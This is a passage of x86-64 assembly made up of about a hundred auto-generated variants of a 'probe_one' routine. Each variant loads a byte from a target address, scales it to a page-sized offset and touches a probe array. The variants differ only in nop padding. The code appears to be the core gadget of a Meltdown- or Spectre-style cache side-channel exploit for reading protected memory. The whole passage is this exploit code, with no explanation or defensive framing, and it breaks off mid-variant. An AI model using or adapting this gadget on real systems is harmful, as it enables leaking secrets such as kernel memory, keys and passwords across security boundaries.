	jmp	.Lprobe_one_win0_continue
## Variant 822
.Lprobe_one_win0_var822:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 823
.Lprobe_one_win0_var823:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 824
.Lprobe_one_win0_var824:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 825
.Lprobe_one_win0_var825:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 826
.Lprobe_one_win0_var826:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 827
.Lprobe_one_win0_var827:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 828
.Lprobe_one_win0_var828:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 829
.Lprobe_one_win0_var829:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 830
.Lprobe_one_win0_var830:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 831
.Lprobe_one_win0_var831:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 832
.Lprobe_one_win0_var832:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 833
.Lprobe_one_win0_var833:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 834
.Lprobe_one_win0_var834:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 835
.Lprobe_one_win0_var835:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 836
.Lprobe_one_win0_var836:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 837
.Lprobe_one_win0_var837:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 838
.Lprobe_one_win0_var838:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 839
.Lprobe_one_win0_var839:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 840
.Lprobe_one_win0_var840:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 841
.Lprobe_one_win0_var841:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 842
.Lprobe_one_win0_var842:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 843
.Lprobe_one_win0_var843:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 844
.Lprobe_one_win0_var844:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 845
.Lprobe_one_win0_var845:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 846
.Lprobe_one_win0_var846:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 847
.Lprobe_one_win0_var847:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 848
.Lprobe_one_win0_var848:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 849
.Lprobe_one_win0_var849:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 850
.Lprobe_one_win0_var850:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 851
.Lprobe_one_win0_var851:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 852
.Lprobe_one_win0_var852:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 853
.Lprobe_one_win0_var853:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 854
.Lprobe_one_win0_var854:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 855
.Lprobe_one_win0_var855:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 856
.Lprobe_one_win0_var856:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 857
.Lprobe_one_win0_var857:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 858
.Lprobe_one_win0_var858:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 859
.Lprobe_one_win0_var859:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 860
.Lprobe_one_win0_var860:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 861
.Lprobe_one_win0_var861:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 862
.Lprobe_one_win0_var862:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 863
.Lprobe_one_win0_var863:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 864
.Lprobe_one_win0_var864:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 865
.Lprobe_one_win0_var865:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 866
.Lprobe_one_win0_var866:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 867
.Lprobe_one_win0_var867:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 868
.Lprobe_one_win0_var868:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 869
.Lprobe_one_win0_var869:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 870
.Lprobe_one_win0_var870:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 871
.Lprobe_one_win0_var871:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 872
.Lprobe_one_win0_var872:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 873
.Lprobe_one_win0_var873:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 874
.Lprobe_one_win0_var874:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 875
.Lprobe_one_win0_var875:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 876
.Lprobe_one_win0_var876:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 877
.Lprobe_one_win0_var877:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 878
.Lprobe_one_win0_var878:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 879
.Lprobe_one_win0_var879:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 880
.Lprobe_one_win0_var880:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 881
.Lprobe_one_win0_var881:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 882
.Lprobe_one_win0_var882:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 883
.Lprobe_one_win0_var883:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 884
.Lprobe_one_win0_var884:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 885
.Lprobe_one_win0_var885:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 886
.Lprobe_one_win0_var886:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 887
.Lprobe_one_win0_var887:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 888
.Lprobe_one_win0_var888:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 889
.Lprobe_one_win0_var889:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 890
.Lprobe_one_win0_var890:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 891
.Lprobe_one_win0_var891:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 892
.Lprobe_one_win0_var892:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 893
.Lprobe_one_win0_var893:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 894
.Lprobe_one_win0_var894:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 895
.Lprobe_one_win0_var895:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 896
.Lprobe_one_win0_var896:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 897
.Lprobe_one_win0_var897:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 898
.Lprobe_one_win0_var898:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 899
.Lprobe_one_win0_var899:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 900
.Lprobe_one_win0_var900:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 901
.Lprobe_one_win0_var901:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 902
.Lprobe_one_win0_var902:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 903
.Lprobe_one_win0_var903:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 904
.Lprobe_one_win0_var904:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 905
.Lprobe_one_win0_var905:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 906
.Lprobe_one_win0_var906:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 907
.Lprobe_one_win0_var907:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 908
.Lprobe_one_win0_var908:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 909
.Lprobe_one_win0_var909:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 910
.Lprobe_one_win0_var910:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 911
.Lprobe_one_win0_var911:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 912
.Lprobe_one_win0_var912:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 913
.Lprobe_one_win0_var913:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 914
.Lprobe_one_win0_var914:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 915
.Lprobe_one_win0_var915:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 916
.Lprobe_one_win0_var916:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 917
.Lprobe_one_win0_var917:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 918
.Lprobe_one_win0_var918:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 919
.Lprobe_one_win0_var919:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 920
.Lprobe_one_win0_var920:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 921
.Lprobe_one_win0_var921:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 922
.Lprobe_one_win0_var922:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 923
.Lprobe_one_win0_var923:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 924
.Lprobe_one_win0_var924:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 925
.Lprobe_one_win0_var925:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 926
.Lprobe_one_win0_var926:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
